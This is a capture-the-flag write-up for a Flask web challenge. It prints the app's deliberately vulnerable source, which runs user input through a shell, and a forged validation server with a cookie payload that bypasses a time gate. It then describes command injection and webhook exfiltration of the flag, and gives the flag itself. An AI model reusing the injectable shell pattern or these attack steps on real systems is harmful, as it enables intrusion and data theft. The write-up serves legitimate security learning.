# Feature Unlocked
## Description
> The world's coolest app has a brand new feature! Too bad it's not released until after the CTF..
>
> https://feature-unlocked-web-challs.csc.tf/

## Challenge Overview
This challenge wants us to access the feature page but it will redirect back to home page until the timer runs out (which is after 7 days)

![image](https://github.com/user-attachments/assets/76e98010-5efd-49f4-971d-64520971aeb4)
<details> 
  <summary> Source code for app.py</summary>
  
```py
import subprocess
import base64
import json
import time
import requests
import os
from flask import Flask, request, render_template, make_response, redirect, url_for
from Crypto.Hash import SHA256
from Crypto.PublicKey import ECC
from Crypto.Signature import DSS
from itsdangerous import URLSafeTimedSerializer

app = Flask(__name__)
app.secret_key = os.urandom(16)
serializer = URLSafeTimedSerializer(app.secret_key)

DEFAULT_VALIDATION_SERVER = 'http://127.0.0.1:1338'
NEW_FEATURE_RELEASE = int(time.time()) + 7 * 24 * 60 * 60
DEFAULT_PREFERENCES = base64.b64encode(json.dumps({
    'theme': 'light',
    'language': 'en'
}).encode()).decode()


def get_preferences():
    preferences = request.cookies.get('preferences')
    if not preferences:
        response = make_response(render_template(
            'index.html', new_feature=False))
        response.set_cookie('preferences', DEFAULT_PREFERENCES)
        return json.loads(base64.b64decode(DEFAULT_PREFERENCES)), response
    return json.loads(base64.b64decode(preferences)), None


@app.route('/')
def index():
    _, response = get_preferences()
    return response if response else render_template('index.html', new_feature=False)


@app.route('/release')
def release():
    token = request.cookies.get('access_token')
    if token:
        try:
            data = serializer.loads(token)
            if data == 'access_granted':
                return redirect(url_for('feature'))
        except Exception as e:
            print(f"Token validation error: {e}")

    validation_server = DEFAULT_VALIDATION_SERVER
    if request.args.get('debug') == 'true':
        preferences, _ = get_preferences()
        validation_server = preferences.get(
            'validation_server', DEFAULT_VALIDATION_SERVER)

    if validate_server(validation_server):
        response = make_response(render_template(
            'release.html', feature_unlocked=True))
        token = serializer.dumps('access_granted')
        response.set_cookie('access_token', token, httponly=True, secure=True)
        return response

    return render_template('release.html', feature_unlocked=False, release_timestamp=NEW_FEATURE_RELEASE)


@app.route('/feature', methods=['GET', 'POST'])
def feature():
    token = request.cookies.get('access_token')
    if not token:
        return redirect(url_for('index'))

    try:
        data = serializer.loads(token)
        if data != 'access_granted':
            return redirect(url_for('index'))

        if request.method == 'POST':
            to_process = request.form.get('text')
            try:
                word_count = f"echo {to_process} | wc -w"
                output = subprocess.check_output(
                    word_count, shell=True, text=True)
            except subprocess.CalledProcessError as e:
                output = f"Error: {e}"
            return render_template('feature.html', output=output)

        return render_template('feature.html')
    except Exception as e:
        print(f"Error: {e}")
        return redirect(url_for('index'))


def get_pubkey(validation_server):
    try:
        response = requests.get(f"{validation_server}/pubkey")
        response.raise_for_status()
        return ECC.import_key(response.text)
    except requests.RequestException as e:
        raise Exception(
            f"Error connecting to validation server for public key: {e}")


def validate_access(validation_server):
    pubkey = get_pubkey(validation_server)
    try:
        response = requests.get(validation_server)
        response.raise_for_status()
        data = response.json()
        date = data['date'].encode('utf-8')
        signature = bytes.fromhex(data['signature'])
        verifier = DSS.new(pubkey, 'fips-186-3')
        verifier.verify(SHA256.new(date), signature)
        return int(date)
    except requests.RequestException as e:
        raise Exception(f"Error validating access: {e}")


def validate_server(validation_server):
    try:
        date = validate_access(validation_server)
        return date >= NEW_FEATURE_RELEASE
    except Exception as e:
        print(f"Error: {e}")
    return False


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=1337)
```

</details>

### Routes:

- `/`

    - This route serves the homepage. If `preferences` cookie aren't set, it returns a response with the default `preferences` cookie.
      
- `/release`

    - It checks for an `access_token` in the cookies, which, if valid, redirects the user to the feature page.
    - If the token is not valid, the route attempts to validate the server. If successful, the user is given an `access_token`, unlocking the feature.
    - This route also accept `?debug` parameter, where the user can include their own validation server inside `preferences` cookie.
- `/feature`

    - This route provides access to the hidden feature, which involves processing user input through a shell command (`wc -w`) to count words.
    - The route ensures that only users with a valid `access_token` can access it.

## Solution
### Access to `/feature` page

- In order to access `/feature` page, we need to setup our own server that can generate public/private key pair and return date as 7 days after the `NEW_FEATURE_RELEASE`.

```py
from flask import Flask, jsonify
import time
from Crypto.Hash import SHA256
from Crypto.PublicKey import ECC
from Crypto.Signature import DSS

app = Flask(__name__)

key = ECC.generate(curve='p256')
pubkey = key.public_key().export_key(format='PEM')


@app.route('/pubkey', methods=['GET'])
def get_pubkey():
    return pubkey, 200, {'Content-Type': 'text/plain; charset=utf-8'}


@app.route('/', methods=['GET'])
def index():
    # Set the time to 7 days from now
    future_time = int(time.time()) + 7 * 24 * 60 * 60
    date = str(future_time)

    h = SHA256.new(date.encode('utf-8'))
    signature = DSS.new(key, 'fips-186-3').sign(h)

    return jsonify({
        'date': date,
        'signature': signature.hex()
    })


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=1338)
```

- Start the server in the terminal and run `ngrok` to expose our local server to the internet. 

- Send the `preferences` cookie with `validation_server` as our `ngrok` URL. Make sure to encode it to base64.
```
{"theme": "light", "language": "en", "validation_server": "https://33c9-2001-e68-5419-58e7-a0e7-ba44-62ec-b33d.ngrok-free.app"}
```
- Make sure `debug` GET parameter link `/release` is set to `True`.
- Check our `ngrok` server, we can see requests from the server.

We finally can access to `/feature` page.

![image](https://github.com/user-attachments/assets/71917899-cdbe-4b50-8922-b4d5f7badd10)

### Command Injection
The feature page can count how many words are inside our input by using `echo` and `wc -w`. When I put `;` in the input, it gives us an error. 

![image](https://github.com/user-attachments/assets/f3ef16dd-b873-4ab8-afd8-7d4c7b0fc65c)

In order to read the flag.txt, we can use `$(...)` (Command substitution syntax)

> Command substitution is a shell feature that allows the output of a command to be used as an argument in another command.

![image](https://github.com/user-attachments/assets/8ee8a4c4-a026-493b-841c-2d1228ceefa3)

Another way is to send the flag back to our server as base64. We can use `Webhook` or `ngrok` as our receiving server.

![image](https://github.com/user-attachments/assets/59c43ffc-86f2-425e-b086-1ce9517260d3)

We get the encoded flag in our Webhook logs. 
![image](https://github.com/user-attachments/assets/c727dafd-4b19-4208-a87f-8fdd685ad873)
```
Q1NDVEZ7ZDFkX3kwdV83MW0zXzdyNHYzbF9mMHJfN2gxNV9mbDQ2PyF9
```

## Flag
```
CSCTF{d1d_y0u_71m3_7r4v3l_f0r_7h15_fl46?!}
```
